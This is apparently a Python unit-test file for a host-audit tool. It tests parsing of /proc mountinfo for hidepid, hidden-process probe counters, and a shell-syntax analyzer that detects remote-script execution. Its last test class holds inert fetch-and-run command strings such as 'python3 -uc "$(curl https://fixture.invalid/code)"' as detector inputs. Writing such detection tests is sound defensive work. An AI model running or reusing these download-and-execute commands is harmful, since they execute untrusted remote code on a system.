"""Exact-head FC-10/FC-23 negative controls for procfs and interpreter parsing.

All inputs are synthetic bytes or inert shell strings. No process, command,
network probe, or privileged operation is performed.
"""
from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from falsicore import collectors, shell_syntax
from falsicore.collectors import Audit, Gaps


class ProcMountAdversarialFormat(unittest.TestCase):
    VALID = b"22 1 0:21 / /proc rw - proc proc rw\n"

    def test_nul_in_mount_options_is_not_unrestricted_policy(self):
        self.assertIsNone(collectors._proc_mount_has_hidepid(
            self.VALID[:-1] + b"\x00\n"))
        self.assertFalse(collectors._proc_mount_has_hidepid(self.VALID))

    def test_blank_mountinfo_row_does_not_hide_next_proc_record(self):
        self.assertFalse(collectors._proc_mount_has_hidepid(
            b"\n" + self.VALID))

    def test_five_field_non_proc_record_must_be_ignored(self):
        self.assertFalse(collectors._proc_mount_has_hidepid(
            b"22 1 0:21 / /tmp\n" + self.VALID))

    def test_four_field_record_requires_an_explicit_unknown_result(self):
        self.assertIsNone(collectors._proc_mount_has_hidepid(
            b"22 1 0:21 /\n" + self.VALID))

    def test_missing_mount_separator_cannot_claim_visibility(self):
        self.assertIsNone(collectors._proc_mount_has_hidepid(
            b"22 1 0:21 / /proc rw opt extra another more\n"))

    def test_separator_before_required_mount_options_is_invalid(self):
        self.assertIsNone(collectors._proc_mount_has_hidepid(
            b"22 1 0:21 / /proc - proc source rw extra\n"))

    def test_procfs_source_name_is_not_filesystem_type(self):
        # The word after the filesystem type is the mount source, not its type.
        self.assertFalse(collectors._proc_mount_has_hidepid(
            b"22 1 0:21 / /proc rw - proc /dev/proc rw\n"))
        self.assertTrue(collectors._proc_mount_has_hidepid(
            b"22 1 0:21 / /proc rw - proc /dev/proc rw,hidepid=2\n"))


class ProcVisibilityResultCounters(unittest.TestCase):
    def setUp(self):
        temp = tempfile.TemporaryDirectory()
        self.addCleanup(temp.cleanup)
        proc = Path(temp.name) / "proc"
        (proc / "self").mkdir(parents=True)
        (proc / "sys/kernel").mkdir(parents=True)
        self.mount = proc / "self/mountinfo"
        self.pid_max = proc / "sys/kernel/pid_max"
        self.pid_max.write_text("1\n")
        self.audit = Audit.__new__(Audit)
        self.audit.scope = "user"
        self.audit.uid = 1001
        self.audit.proc_root = proc
        self.audit._proc_self = lambda: proc / "self"
        self.audit._listed_pids_and_tids = lambda: (set(), set())
        self.audit.pid_probe = lambda _pid: False
        self.audit.over_budget = lambda: False
        self.audit.boot_id = "synthetic"
        self.audit.findings = []
        self.audit.stats = {}

    def measure(self):
        gaps, stats = Gaps(), {}
        self.audit._hidden_processes(gaps, stats)
        return gaps, stats["processes"]

    def test_unavailable_mountinfo_cannot_claim_probed_pids(self):
        gaps, result = self.measure()
        self.assertEqual(result, {
            "status": "MOUNT_VISIBILITY_UNAVAILABLE",
            "hidden": 0, "pid_max_probed": 0})
        self.assertGreater(gaps.incomplete["READ_FAILED"], 0)

    def test_unknown_proc_mount_policy_has_zero_probe_counters(self):
        self.mount.write_text("22 1 0:21 / /proc\n")
        gaps, result = self.measure()
        self.assertEqual(result, {
            "status": "PROC_MOUNT_POLICY_UNDETERMINED",
            "hidden": 0, "pid_max_probed": 0})
        self.assertEqual(gaps.incomplete["PARSE_UNSUPPORTED"], 1)

    def test_one_candidate_is_not_a_confirmation_cap_overflow(self):
        self.mount.write_bytes(ProcMountAdversarialFormat.VALID)
        self.audit.pid_probe = lambda _pid: True
        self.audit._tgid_of = lambda _pid: 0
        with patch.object(collectors, "PID_RECHECK_DELAY", 0):
            gaps, result = self.measure()
        self.assertEqual(result["candidates"], 1)
        self.assertEqual(result["hidden"], 0)
        self.assertNotIn("ENUMERATION_LIMIT", gaps.incomplete)

    def test_exact_confirmation_cap_does_not_claim_truncation(self):
        self.mount.write_bytes(ProcMountAdversarialFormat.VALID)
        self.pid_max.write_text("200\n")
        self.audit.pid_probe = lambda _pid: True
        self.audit._tgid_of = lambda _pid: 0
        with patch.object(collectors, "PID_RECHECK_DELAY", 0):
            gaps, result = self.measure()
        self.assertEqual(result["candidates"], 200)
        self.assertEqual(result["hidden"], 0)
        self.assertNotIn("ENUMERATION_LIMIT", gaps.incomplete)


class ExecutedInterpreterOperand(unittest.TestCase):
    def test_non_node_long_eval_option_is_uncertain_not_remote_execution(self):
        for script in (
            'python3 --eval="$(curl https://fixture.invalid/data)"',
            'perl --eval="$(curl https://fixture.invalid/data)"',
        ):
            with self.subTest(script=script):
                result = shell_syntax.analyze(script)
                self.assertNotIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              result["limitations"])

    def test_minimal_supported_python_short_group_executes_code_operand(self):
        result = shell_syntax.analyze(
            'python3 -uc "$(curl https://fixture.invalid/code)"')
        self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
        self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                      result["limitations"])

    def test_missing_grouped_code_operand_is_not_silent(self):
        for script in ("python3 -uc", "python3 -Iuc"):
            with self.subTest(script=script):
                result = shell_syntax.analyze(script)
                self.assertIn("INLINE_INTERPRETER_CODE_NOT_ANALYZED",
                              result["limitations"])


if __name__ == "__main__":
    unittest.main()
